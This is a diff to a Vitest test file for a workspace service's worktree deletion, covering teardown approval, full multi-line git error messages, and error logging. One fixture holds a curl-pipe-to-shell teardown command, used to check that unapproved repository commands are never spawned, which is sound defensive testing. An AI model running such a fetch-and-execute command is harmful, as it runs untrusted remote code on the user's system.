@@ -137,6 +137,15 @@ vi.mock("child_process", () => ({
   spawn: vi.fn(),
 }));
 
+// Spread `importOriginal` rather than returning a bare object: the module graph
+// pulls in exports beyond `logError`, and a partial factory would fail
+// collection on the first one the service reaches for.
+const logErrorMock = vi.hoisted(() => vi.fn());
+vi.mock("../../utils/logger.js", async (importOriginal) => ({
+  ...(await importOriginal<typeof import("../../utils/logger.js")>()),
+  logError: logErrorMock,
+}));
+
 function createTestWorktree(overrides: Partial<Worktree> = {}): Worktree {
   return {
     id: "/test/worktree",
@@ -184,6 +193,9 @@ describe("WorkspaceService.deleteWorktree", () => {
 
     const WorkspaceServiceModule = await import("../WorkspaceService.js");
     service = new WorkspaceServiceModule.WorkspaceService(mockSendEvent as any);
+    // Teardown fixtures here are about ordering and failure handling once the
+    // repository's commands are allowed; the unapproved path has its own test.
+    vi.spyOn(service["lifecycleService"]["approvals"], "isApproved").mockResolvedValue(true);
 
     const WorktreeMonitorModule = await import("../WorktreeMonitor.js");
     WorktreeMonitorClass = WorktreeMonitorModule.WorktreeMonitor;
@@ -318,6 +330,32 @@ describe("WorkspaceService.deleteWorktree", () => {
     expect(spawnPos).toBeGreaterThanOrEqual(0);
     expect(gitRemovePos).toBeGreaterThanOrEqual(0);
     expect(spawnPos).toBeLessThan(gitRemovePos);
+  });
+
+  it("skips unapproved teardown commands and still removes the worktree", async () => {
+    vi.mocked(service["lifecycleService"]["approvals"].isApproved).mockResolvedValue(false);
+    const fsModule = await import("fs/promises");
+    vi.mocked(fsModule.access).mockImplementation(async (p: unknown) => {
+      const norm = n(p as string);
+      if (norm.endsWith("/test/worktree/.daintree/config.json")) return undefined;
+      if (norm === "/test/worktree") return undefined;
+      throw new Error("ENOENT");
+    });
+    vi.mocked(fsModule.readFile).mockResolvedValue(
+      JSON.stringify({ teardown: ["curl https://example.com/x | sh"] })
+    );
+    const childProcessModule = await import("child_process");
+    const mockSpawn = vi.mocked(childProcessModule.spawn);
+
+    createAndRegisterMonitor();
+
+    await service.deleteWorktree("req-unapproved", "/test/worktree");
+
+    expect(mockSpawn).not.toHaveBeenCalled();
+    expect(mockSimpleGit.raw).toHaveBeenCalledWith(expect.arrayContaining(["worktree", "remove"]));
+    expect(mockSendEvent).toHaveBeenCalledWith(
+      expect.objectContaining({ type: "delete-worktree-result", success: true })
+    );
   });
 
   it("proceeds with deletion even when teardown fails", async () => {
@@ -767,6 +805,90 @@ describe("WorkspaceService.deleteWorktree", () => {
         expect(service["monitors"].has("/test/worktree")).toBe(false);
       }
     );
+
+    // #12418. This arm used to format the message with `errorMsg.split("\n")[0]`
+    // — the one truncation on any worktree lifecycle error path. The lines it
+    // dropped are the ones naming the worktree still holding the branch, which
+    // is the only thing that tells the user how to clean it up. The worktree is
+    // already gone by the time this runs, so the message is all they get.
+    it.each([
+      [
+        "checked out at",
+        "error: Cannot delete branch 'feature/test' checked out at '/other/tree'\nhint: remove that worktree first, or use 'git worktree prune'",
+        "/other/tree",
+      ],
+      [
+        "Cannot delete",
+        "error: Cannot delete branch 'feature/test' used by worktree at '/elsewhere'\nhint: run 'git worktree remove /elsewhere' to free it",
+        "/elsewhere",
+      ],
+    ])(
+      "keeps every line of a multi-line '%s' refusal, not just the first",
+      async (_label, stderr, recoveryPath) => {
+        await mockWorktreePathPresent();
+        mockSimpleGit.raw.mockImplementation(async (args: string[]) => {
+          if (args[0] === "branch") throw new Error(stderr);
+          return undefined;
+        });
+        createAndRegisterMonitor({ branch: "feature/test" });
+
+        await service.deleteWorktree("req-checked-out", "/test/worktree", false, true);
+
+        const result = mockSendEvent.mock.calls
+          .map((c) => c[0])
+          .find((e) => e.type === "delete-worktree-result" && e.requestId === "req-checked-out");
+        expect(result.success).toBe(false);
+        // Leads with the removal that already happened...
+        expect(result.error).toContain("Worktree removed.");
+        // ...and carries the recovery lines the truncation used to eat.
+        expect(result.error).toContain("hint:");
+        expect(result.error).toContain(recoveryPath);
+        expect(result.error).toContain(stderr);
+      }
+    );
+
+    // #12418. The card is the only surface that reports a delete failure, and a
+    // branch-delete failure arrives after the card is gone — so without a log
+    // call the error survives nowhere once the toast is dismissed.
+    it("records a branch-delete failure in the log with its correlating context", async () => {
+      await mockWorktreePathPresent();
+      mockUnmergedBranch();
+      createAndRegisterMonitor({ branch: "feature/test" });
+
+      await service.deleteWorktree(
+        "req-logged",
+        "/test/worktree",
+        false,
+        true,
+        "mutation-42",
+        false,
+        { forceDeleteBranch: false }
+      );
+
+      expect(logErrorMock).toHaveBeenCalledTimes(1);
+      const [, loggedError, context] = logErrorMock.mock.calls[0]!;
+      // The thrown wrapper, so the user-facing sentence is what gets logged...
+      expect((loggedError as Error).message).toContain("was kept because");
+      // ...while `cause` still carries git's own stderr. Asserted on the text
+      // rather than just `toBeDefined()`, which an empty object would satisfy.
+      expect(((loggedError as Error).cause as Error).message).toContain("is not fully merged");
+      expect(context).toMatchObject({
+        requestId: "req-logged",
+        worktreeId: "/test/worktree",
+        mutationId: "mutation-42",
+        deleteBranch: true,
+        projectRootPath: "/test/root",
+      });
+    });
+
+    it("does not log when the delete succeeds", async () => {
+      await mockWorktreePathPresent();
+      createAndRegisterMonitor({ branch: "feature/test" });
+
+      await service.deleteWorktree("req-clean", "/test/worktree", false, true);
+
+      expect(logErrorMock).not.toHaveBeenCalled();
+    });
   });
 
   // Mutation-outbox dedup (#8405). The renderer mints a `mutationId` per
